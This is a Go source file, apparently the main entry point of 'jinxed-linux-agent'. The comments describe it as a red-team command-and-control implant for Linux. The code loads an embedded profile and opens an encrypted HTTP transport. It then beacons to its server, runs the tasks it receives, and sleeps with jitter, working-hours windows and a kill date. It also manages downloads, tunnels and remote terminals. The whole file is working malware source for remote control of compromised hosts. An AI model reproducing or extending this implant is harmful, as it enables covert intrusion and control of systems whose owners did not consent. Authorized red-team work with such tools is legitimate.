package main

import (
	"flag"
	"fmt"
	"math/rand"
	"os"
	"runtime/debug"
	"time"
	_ "time/tzdata" // keep kill-date / working-time correct on minimal hosts
)

func main() {
	// The binary is normally launched with no arguments. The flags exist for
	// red-team ergonomics (debug logging during infrastructure validation).
	debugFlag := flag.Bool("debug", false, "log transport errors to stderr")
	versionFlag := flag.Bool("version", false, "print version and exit")
	flag.Parse()

	if *versionFlag {
		fmt.Printf("jinxed-linux-agent %s\n", agentVersion())
		return
	}

	cfg, err := loadConfig(profileBlob)
	if err != nil {
		fmt.Fprintf(os.Stderr, "jinxed: %v\n", err)
		os.Exit(2)
	}
	cfg.Debug = *debugFlag

	a, err := newAgent(cfg)
	if err != nil {
		fmt.Fprintf(os.Stderr, "jinxed: %v\n", err)
		os.Exit(2)
	}

	beat := a.buildBeat()
	transport, err := newHTTPTransport(cfg, beat)
	if err != nil {
		fmt.Fprintf(os.Stderr, "jinxed: %v\n", err)
		os.Exit(2)
	}
	transport.setSessionKey(a.sessionKey)

	a.run(transport)
}

func (a *agent) run(transport *httpTransport) {
	for {
		if a.isTerminated() {
			break
		}

		plain := a.out.take()
		data, err := transport.exchange(plain, a.sessionKey)
		if err != nil {
			a.debugf("check-in failed: %v", err)
		} else if len(data) > 0 {
			a.processTasks(data)
		}

		// Local producers append asynchronously; drain them before deciding
		// whether the agent may sleep.
		a.drain()

		if a.isTerminated() {
			taskID, method := a.exitRecord()
			a.reply(taskID, cmdTerm, func(w *writer) { w.u32(method) })
			if plain := a.out.take(); plain != nil {
				_, _ = transport.exchange(plain, a.sessionKey)
			}
			break
		}

		if a.out.pending() {
			// Output is waiting: beacon back immediately, exactly like the
			// Windows agent (hasOutput suppresses the sleep).
			continue
		}

		a.sleep()
	}

	a.shutdown()
}

// drain gives background pumps a chance to append their output, and performs
// the periodic downloader tick.
func (a *agent) drain() {
	a.dl.pump(a)
}

func (a *agent) sleep() {
	if !a.active() {
		a.terminate(2, 0)
		return
	}

	if ws := a.workingSleep(); ws > 0 {
		a.interruptibleSleep(time.Duration(ws) * time.Second)
		return
	}

	sleep := time.Duration(a.cfg.Sleep) * time.Second
	if sleep <= 0 {
		// "interact" mode: a short yield keeps the loop responsive without
		// spinning the CPU.
		time.Sleep(50 * time.Millisecond)
		return
	}

	if a.cfg.Jitter > 0 {
		maxDelta := int64(a.cfg.Sleep) * int64(a.cfg.Jitter) / 100
		if maxDelta > 0 {
			delta := time.Duration(rand.Int63n(maxDelta+1)) * time.Second
			sleep -= delta
		}
	}
	if sleep < 0 {
		sleep = 0
	}
	a.interruptibleSleep(sleep)
}

func (a *agent) interruptibleSleep(d time.Duration) {
	if d <= 0 {
		return
	}
	timer := time.NewTimer(d)
	defer timer.Stop()
	select {
	case <-timer.C:
	case <-a.out.wake:
	}
}

func (a *agent) shutdown() {
	a.jobs.killAll()
	a.tun.closeAll()
	a.term.closeAll()
	a.dl.closeAll()
}

func (a *agent) debugf(format string, args ...interface{}) {
	if !a.cfg.Debug {
		return
	}
	fmt.Fprintf(os.Stderr, "jinxed: "+format+"\n", args...)
}

func agentVersion() string {
	if info, ok := debug.ReadBuildInfo(); ok {
		return info.Main.Version
	}
	return "dev"
}
